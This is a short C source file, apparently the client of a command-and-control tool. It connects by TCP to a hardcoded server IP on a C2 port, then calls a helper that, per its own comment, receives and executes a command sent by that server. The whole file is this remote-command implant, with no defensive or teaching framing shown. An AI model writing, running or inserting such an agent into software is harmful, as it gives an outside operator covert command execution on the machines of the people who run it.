#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "c2.h"
#include "client/client_psh.h"

#define SERVER_IP "192.168.100.100"

int main() {
    SOCK_INIT();

    // Create a TCP socket descriptor.
    sock_t sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in serv = {0};

    // Config
    serv.sin_family = AF_INET;
    serv.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, SERVER_IP, &serv.sin_addr);

    // Attempt to connect to c2server
    if (connect(sock, (struct sockaddr*)&serv, sizeof(serv)) < 0) {
        return 1;
    }

    // Receive and exec command
    char cmd[4096], buf[C2_BUF_SIZE];
    psh_receive(cmd, sock, buf);

    CLOSE_SOCK(sock);
    SHUT_DOWN();
    return 0;
}